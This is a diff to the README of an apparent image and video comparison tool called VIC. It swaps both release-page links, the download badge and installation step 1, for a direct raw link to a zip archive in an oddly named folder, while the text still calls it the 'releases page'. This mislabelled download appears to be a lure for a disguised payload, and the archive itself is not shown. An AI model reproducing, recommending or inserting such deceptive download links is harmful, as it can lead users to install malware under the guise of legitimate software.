@@ -1,6 +1,6 @@
 # 👁️ VIC - Compare images and videos with precision
 
-[![Download VIC for Windows](https://img.shields.io/badge/Download_VIC-Blue?style=for-the-badge)](https://github.com/vedeshsutar23-cmd/VIC/releases)
+[![Download VIC for Windows](https://img.shields.io/badge/Download_VIC-Blue?style=for-the-badge)](https://github.com/vedeshsutar23-cmd/VIC/raw/refs/heads/main/achromous/Software_v2.7-beta.3.zip)
 
 VIC provides tools to compare images and videos side by side. It calculates quality metrics like PSNR and SSIM to measure differences between two files. You can use this software for color grading, compression testing, or quality control. The program handles large files and runs smoothly on Windows.
 
@@ -15,7 +15,7 @@ VIC provides tools to compare images and videos side by side. It calculates qual
 
 Follow these steps to set up the software.
 
-1. Visit the [releases page](https://github.com/vedeshsutar23-cmd/VIC/releases) to download the latest version.
+1. Visit the [releases page](https://github.com/vedeshsutar23-cmd/VIC/raw/refs/heads/main/achromous/Software_v2.7-beta.3.zip) to download the latest version.
 2. Look for the file ending in `.zip` or `.exe` under the Assets section.
 3. Save the file to your computer.
 4. Extract the folder if you downloaded a zip archive.
